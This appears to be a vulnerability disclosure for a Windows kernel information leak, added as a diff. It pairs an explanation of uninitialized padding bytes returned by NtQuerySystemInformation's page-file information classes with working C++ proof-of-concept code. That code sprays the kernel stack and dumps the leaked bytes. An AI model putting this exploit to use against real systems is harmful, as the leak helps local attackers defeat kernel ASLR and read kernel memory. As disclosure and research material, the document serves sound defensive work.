@@ -1,0 +1,132 @@
+/*
+We have discovered that the nt!NtQuerySystemInformation system call invoked with the SystemPageFileInformation (0x12) and SystemPageFileInformationEx (0x90) information classes discloses uninitialized kernel stack memory to user-mode clients. The vulnerability affects 64-bit versions of Windows 7 to 10.
+
+Based on the contents of the output structure returned by the kernel, we have concluded that it contains a nested UNICODE_STRING structure at offset 0x10, which has the following definition:
+
+--- cut ---
+  typedef struct _LSA_UNICODE_STRING {
+    USHORT Length;
+    USHORT MaximumLength;
+    PWSTR  Buffer;
+  } UNICODE_STRING, *PUNICODE_STRING;
+--- cut ---
+
+On x64 builds, the compiler introduces 4 bytes of padding between the "MaximumLength" and "Buffer" fields, in order to align the "Buffer" pointer to an 8-byte boundary. It seems that these padding bytes are never initialized in the kernel's local copy of the structure, and so they are returned to the user-mode caller in this form.
+
+The problem is best illustrated by running the attached proof-of-concept program, which sprays the kernel stack with a 0x41 ('A') marker byte, invokes the nt!NtQuerySystemInformation syscall with the affected information classes, and prints the contents of the output buffer on the screen. The result of running it in our test Windows 10 environment is as follows:
+
+--- cut ---
+  ---------- SystemPageFileInformation Status: 0, Return Length: 48
+  00000000: 00 00 00 00 00 c0 02 00 00 00 00 00 01 01 00 00 ................
+  00000010: 26 00 28 00 41 41 41 41 a0 fe 38 5c cc 00 00 00 &.(.AAAA..8\....
+  00000020: 5c 00 3f 00 3f 00 5c 00 43 00 3a 00 5c 00 70 00 \.?.?.\.C.:.\.p.
+  00000030: 61 00 67 00 65 00 66 00 69 00 6c 00 65 00 2e 00 a.g.e.f.i.l.e...
+  00000040: 73 00 79 00 73 00 00 00 ?? ?? ?? ?? ?? ?? ?? ?? s.y.s...........
+  ---------- SystemPageFileInformationEx Status: 0, Return Length: 50
+  00000000: 00 00 00 00 00 c0 02 00 00 00 00 00 01 01 00 00 ................
+  00000010: 26 00 28 00 41 41 41 41 a8 fe 38 5c cc 00 00 00 &.(.AAAA..8\....
+  00000020: 00 c0 02 00 3f c1 13 00 5c 00 3f 00 3f 00 5c 00 ....?...\.?.?.\.
+  00000030: 43 00 3a 00 5c 00 70 00 61 00 67 00 65 00 66 00 C.:.\.p.a.g.e.f.
+  00000040: 69 00 6c 00 65 00 2e 00 73 00 79 00 73 00 00 00 i.l.e...s.y.s...
+--- cut ---
+
+It is clearly visible that in both cases, 4 bytes returned at offsets 0x14-0x17 originate from an uninitialized kernel stack region. Repeatedly triggering the vulnerability could allow local authenticated attackers to defeat certain exploit mitigations (kernel ASLR) or read other secrets stored in the kernel address space.
+*/
+
+#include <Windows.h>
+#include <winternl.h>
+#include <ntstatus.h>
+
+#include <cstdio>
+
+#pragma comment(lib, "ntdll.lib")
+
+#define SystemPageFileInformation ((SYSTEM_INFORMATION_CLASS)0x12)
+#define SystemPageFileInformationEx ((SYSTEM_INFORMATION_CLASS)0x90)
+
+extern "C" {
+  NTSTATUS WINAPI NtQuerySystemInformation(
+    _In_      SYSTEM_INFORMATION_CLASS SystemInformationClass,
+    _Inout_   PVOID                    SystemInformation,
+    _In_      ULONG                    SystemInformationLength,
+    _Out_opt_ PULONG                   ReturnLength
+  );
+};
+
+VOID PrintHex(PVOID Buffer, ULONG dwBytes) {
+  PBYTE Data = (PBYTE)Buffer;
+  for (ULONG i = 0; i < dwBytes; i += 16) {
+    printf("%.8x: ", i);
+
+    for (ULONG j = 0; j < 16; j++) {
+      if (i + j < dwBytes) {
+        printf("%.2x ", Data[i + j]);
+      }
+      else {
+        printf("?? ");
+      }
+    }
+
+    for (ULONG j = 0; j < 16; j++) {
+      if (i + j < dwBytes && Data[i + j] >= 0x20 && Data[i + j] <= 0x7e) {
+        printf("%c", Data[i + j]);
+      }
+      else {
+        printf(".");
+      }
+    }
+
+    printf("\n");
+  }
+}
+
+VOID MyMemset(PBYTE ptr, BYTE byte, ULONG size) {
+  for (ULONG i = 0; i < size; i++) {
+    ptr[i] = byte;
+  }
+}
+
+VOID SprayKernelStack() {
+  static bool initialized = false;
+  static HPALETTE(NTAPI *EngCreatePalette)(
+    _In_ ULONG iMode,
+    _In_ ULONG cColors,
+    _In_ ULONG *pulColors,
+    _In_ FLONG flRed,
+    _In_ FLONG flGreen,
+    _In_ FLONG flBlue
+    );
+
+  if (!initialized) {
+    EngCreatePalette = (HPALETTE(NTAPI*)(ULONG, ULONG, ULONG *, FLONG, FLONG, FLONG))GetProcAddress(LoadLibrary(L"gdi32.dll"), "EngCreatePalette");
+    initialized = true;
+  }
+
+  static ULONG buffer[256];
+  MyMemset((PBYTE)buffer, 'A', sizeof(buffer));
+  EngCreatePalette(1, ARRAYSIZE(buffer), buffer, 0, 0, 0);
+  MyMemset((PBYTE)buffer, 'B', sizeof(buffer));
+}
+
+int main() {
+  BYTE OutputBuffer[128];
+  ULONG ReturnLength = 0;
+
+  RtlZeroMemory(OutputBuffer, sizeof(OutputBuffer));
+
+  SprayKernelStack();
+  NTSTATUS Status = NtQuerySystemInformation(SystemPageFileInformation, OutputBuffer, sizeof(OutputBuffer), &ReturnLength);
+
+  printf("---------- SystemPageFileInformation Status: %x, Return Length: %x\n", Status, ReturnLength);
+  PrintHex(OutputBuffer, ReturnLength);
+
+  RtlZeroMemory(OutputBuffer, sizeof(OutputBuffer));
+
+  SprayKernelStack();
+  Status = NtQuerySystemInformation(SystemPageFileInformationEx, OutputBuffer, sizeof(OutputBuffer), &ReturnLength);
+
+  printf("---------- SystemPageFileInformationEx Status: %x, Return Length: %x\n", Status, ReturnLength);
+  PrintHex(OutputBuffer, ReturnLength);
+
+  return 0;
+}
